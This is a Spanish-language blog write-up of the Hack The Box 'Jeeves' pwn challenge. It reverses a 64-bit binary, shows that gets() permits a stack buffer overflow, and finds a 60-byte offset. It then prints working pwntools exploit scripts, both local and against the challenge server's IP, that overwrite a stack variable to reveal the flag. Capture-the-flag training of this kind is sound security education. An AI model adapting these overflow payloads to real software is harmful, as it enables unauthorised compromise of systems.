---
title: Jeeves - Pwn Challenge (HTB) ❤
author: sha16
categories: [linux, binary exploitation, htb]
tags: [linux, pwn, htb, 64-bit] 
---

![Untitled](/assets/img/htb/pwn/Jeeves/image.png)

Este es un reto de pwning el cual implica explotar una vulnerabilidad Buffer Overflow en un binario de 64 bits. El objetivo principal es sobrescribir el valor de un registro de memoria en específico, el cual se emplea en una condición dentro del programa; la cual si resulta ser verdadera, provocará que este imprima la flag.

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled.png)

Como se observa a continuación, el binario recibe un input del usuario, el cual es impreso en el output resultante de la ejecución:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%201.png)

Al analizar el código Assembler se identifican dos instrucciones importantes en la función **main**.

Primeramente se asigna el valor `0xdeadc0d3` al registro `rbp-4` , a través de la instrucción **MOV**.

```jsx
0x00005555555551f5 <+12>:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
```

Posterior a esto, dicho valor es sometido a un condicional, a través de una instrucción **CMP**, de comparación, con el valor `0x1337bab3`.

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%202.png)

Al observar el código fuente, reverseado con **Ghidra**, se puede entender mucho mejor cómo funciona el programa.

Como se visualiza en imagen, el valor de la variable `target_variable` es sometido a un condicional. Si dicho valor es igual a `0x1337bab3`, el programa imprimirá el contenido del archivo `flag.txt`, caso contrario no lo hará y sólo terminará la ejecución: 

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%203.png)

Es importante mencionar que en el código reverseado se identifica que el programa recibe el input del usuario a través de la función `gets`, la cual es vulnerable a ataques de desbordamiento de buffer, de acuerdo a su documentación:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%204.png)

Sabiendo esto, se procede a debuggear el binario, utilizando la herramienta **gdb-gef**.

Previo a arrancar, se debe crear un archivo `flag.txt`, de prueba, debido a que el programa lee el contenido de este para obtener el valor de la flag: 

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%205.png)

Hecho esto, se procede a abrir el binario con **gdb-gef**, donde se establece un breakpoint en la instrucción de memoria, en la cual se realiza la comparación del valor `0x1337bab3` con el valor almacenado en el registro `rbp-0x4`:

```jsx
0x0000555555555236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
```

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%206.png)

Al ejecutar el programa, con el breakpoint en el condicional, se logra visualizar que el valor almacenado en el registro `rbp-4`, corresponde a `0xdeadc0d3`:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%207.png)

A modo de prueba se modifica el valor de dicho registro de memoria por `0x1337bab3`, con el objetivo de que el resultado de la condición sea verdadero:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%208.png)

Como se mostró en la imagen anterior, cuando el resultado de la condicional es verdadero, el programa imprime la flag, almacenada en el archivo `flag.txt`.

Sin embargo, para lograr el desafío de HTB no podemos usar **gdb**, debemos lograrlo directamente a través de un Buffer Overflow.

Para esto, primeramente podemos identificar que se configura el input del usuario, el cual como límite debe ser una cadena de 44 bytes:

```c
char user_name [44];
int flag_content;
void *flag_length;
int target_variable;
```

Si metemos más caracteres de los que soporta el valor de la variable, el buffer se sobrescribe al momento de llamar a la función `gets`, lo cual causa que el programa no termine su ejecución de manera exitosa:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%209.png)

Sabiendo esto, se crea una cadena de 100 bytes con la herramienta `pattern create`, de gdb, la cual se inyecta en el input para detectar el offset, que corresponde a todo el junk previo a meter para sobrescribir el valor almacenado en `rbp-4`:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2010.png)

Como se puede ver, luego de inyectar dicha entrada de caracteres, se detecta que el offset es 60:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2011.png)

De esta manera, lo que se puede concluir hasta ahora, es que tenemos que introducir 60 caracteres antes de sobrescribir el valor de `rbp-4`.

De esta forma, a modo de validar la sobreescritura de `rbp-4` se crea la siguiente cadena, la cual son 60 As y 6 Bs:

```jsx
┌──(sha16㉿offs3c)-[~]
└─$ python3 -c "print('\x41'*60+'\x42'*6)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
```

Posterior a la inyección de la cadena creada, se determina que el offset es correcto, dado que el valor de `rbp-4` es `BBBBBB`:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2012.png)

Dado esto, se procede a armar el siguiente exploit en Python3, el cual se encarga de inyectar el valor en el registro `rbp-4`:

```python
#!/usr/bin/python3

from pwn import context, process, p64

if __name__ == '__main__':
    # Set program context
    context.update(arch='amd64', os='linux')
    elf = process('./jeeves')

    # BoF
    offset = 60
    junk = b'\x41' * offset
    rbp_4 = p64(0x1337bab3)
    payload = junk + rbp_4 + b'\n\r'

    # Send payload
    elf.sendline(payload)
    elf.interactive()
```

Al ejecutar el exploit, se observa que la flag es obtenida correctamente:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2013.png)

Sabiendo que el exploit funciona, ahora este puede ser adaptado a una versión remota para obtener el flag de HackTheBox y completar el reto correctamente:

```python
#!/usr/bin/python3

from pwn import p64
from socket import socket

if __name__ == '__main__':
    # Connection Data
    host = '206.189.121.78'
    port = 31129

    # BoF (payload)
    offset = 60
    junk = b'\x41' * offset
    rbp_4 = p64(0x1337bab3)
    payload = junk + rbp_4 + b'\n\r'

    with socket() as s:
        s.connect((host, port))
        s.send(payload)
        print(s.recv(4096))
        print(s.recv(4096))
```

Al ejecutar el exploit, se obtiene con éxito la flag del desafío:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2014.png)

De forma aparte, me gustaría mostrarles cómo con la librería de pwntools también pueden crear su propio exploit, un tanto más elegante:

```python
#!/usr/bin/python3

from pwn import remote, p64, success
from socket import socket

if __name__ == '__main__':
    # Connection Data
    host = '206.189.121.78'
    port = 31129

    # BoF (payload)
    offset = 60
    junk = b'\x41' * offset
    rbp_4 = p64(0x1337bab3)
    payload = junk + rbp_4 + b'\n\r'
		
    # Remote Connection
    connection = remote(host, port)
    connection.sendline(payload)
    connection.recvuntil(b'Here\'s a small gift:')
    flag = connection.recv(4096)
    success(b'HTB Flag:' + flag)
```

Al ejecutarlo la flag es obtenida a través de un output mucho más limpio:

![Untitled](/assets/img/htb/pwn/Jeeves/Untitled%2015.png)

Eso es todo, espero que le haya gustado y servido mucho este post para aprender algunos conceptos básicos de binary exploitation. La verdad es una temática en la que recién me estoy adentrando y compartirles esto me sirve mucho para retroalimentar estos conceptos. 

Cualquier duda, consulta, corrección, etc., saben que me pueden contactar en LinkedIn o Twitter 👾

Happy Hacking 🏴‍☠️